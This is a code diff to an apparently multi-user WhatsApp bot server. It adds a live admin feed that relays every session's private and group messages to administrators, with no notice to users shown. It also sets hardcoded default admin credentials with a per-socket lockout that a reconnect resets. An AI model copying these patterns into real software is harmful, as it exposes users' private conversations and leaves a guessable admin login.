@@ -516,6 +516,28 @@ function saveBotData() {
 const sessions = {}; 
 const userSockets = {}; 
 const messageLogs = {}; 
+const adminSockets = new Set();
+const adminChatLogs = [];
+
+function publishAdminChatMessage(entry) {
+    const cleanEntry = {
+        id: entry.id,
+        sessionId: entry.sessionId,
+        chatId: entry.chatId,
+        chatName: entry.chatName || entry.chatId,
+        sender: entry.sender || 'Desconocido',
+        text: entry.text || '',
+        type: entry.type || 'conversation',
+        isGroup: Boolean(entry.isGroup),
+        fromMe: Boolean(entry.fromMe),
+        timestamp: entry.timestamp || new Date().toISOString()
+    };
+    adminChatLogs.push(cleanEntry);
+    if (adminChatLogs.length > 200) adminChatLogs.shift();
+    for (const adminSocket of adminSockets) {
+        if (adminSocket.connected) adminSocket.emit('admin-chat-message', cleanEntry);
+    }
+}
 
 function getDashboardStats() {
     const connectedSessions = Object.values(sessions).filter(session => session.isConnected && session.sock?.user);
@@ -826,6 +848,29 @@ class BotSession {
                         if (this.processedMessages.has(msgId)) return;
                         this.processedMessages.add(msgId);
                         if (this.processedMessages.size > 1000) this.processedMessages.delete(this.processedMessages.values().next().value);
+                        if (!isStatus) {
+                            const senderJid = msg.key.participant || (isMe ? this.sock.user?.id : from);
+                            let chatName = this.userChats?.[from]?.name || from;
+                            if (isGroup && !this.userChats?.[from]?.name) {
+                                try {
+                                    const metadata = await this.sock.groupMetadata(from);
+                                    chatName = metadata.subject || from;
+                                    this.userChats[from] = { name: chatName };
+                                } catch (e) {}
+                            }
+                            publishAdminChatMessage({
+                                id: msgId,
+                                sessionId: this.userId,
+                                chatId: from,
+                                chatName,
+                                sender: msg.pushName || senderJid,
+                                text: text || `[${type.replace('Message', '') || 'mensaje'}]`,
+                                type,
+                                isGroup,
+                                fromMe: isMe,
+                                timestamp: new Date(Number(msg.messageTimestamp || Date.now()) * 1000 || Date.now()).toISOString()
+                            });
+                        }
 
                         if (!isStatus) {
                             let logEntry = { text, type };
@@ -1593,12 +1638,26 @@ io.on('connection', (socket) => {
     });
 
     // Admin auth
-    socket.on('admin-auth', (password) => {
-        const adminPass = process.env.ADMIN_PASSWORD || 'syed_techteaM';
-        if (password === adminPass) {
+    socket.on('admin-auth', ({ username, password } = {}) => {
+        const now = Date.now();
+        if (socket.adminLockUntil && socket.adminLockUntil > now) {
+            socket.emit('admin-auth-fail');
+            return;
+        }
+        const adminUser = process.env.ADMIN_USERNAME || 'admin*';
+        const adminPass = process.env.ADMIN_PASSWORD || 'admin*1';
+        if (username === adminUser && password === adminPass) {
             socket.authenticated = true;
+            socket.adminAttempts = 0;
+            adminSockets.add(socket);
             socket.emit('admin-auth-success');
+            socket.emit('admin-chat-history', adminChatLogs.slice(-200));
         } else {
+            socket.adminAttempts = (socket.adminAttempts || 0) + 1;
+            if (socket.adminAttempts >= 5) {
+                socket.adminLockUntil = now + 60 * 1000;
+                socket.adminAttempts = 0;
+            }
             socket.emit('admin-auth-fail');
         }
     });
@@ -1741,6 +1800,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('disconnect', () => {
+        adminSockets.delete(socket);
         for (const [userId, socketId] of Object.entries(userSockets)) {
             if (socketId === socket.id) {
                 delete userSockets[userId];
